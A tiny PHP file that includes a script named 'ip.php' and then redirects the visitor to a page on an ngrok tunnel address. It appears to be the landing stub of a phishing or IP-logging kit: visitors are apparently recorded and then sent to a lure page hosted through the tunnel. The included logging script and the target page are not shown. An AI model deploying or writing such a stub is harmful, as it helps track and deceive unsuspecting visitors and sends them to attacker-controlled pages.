<?php
include 'ip.php';
header('Location: https://2501-103-225-13-242.ngrok.io/index2.html');
exit
?>
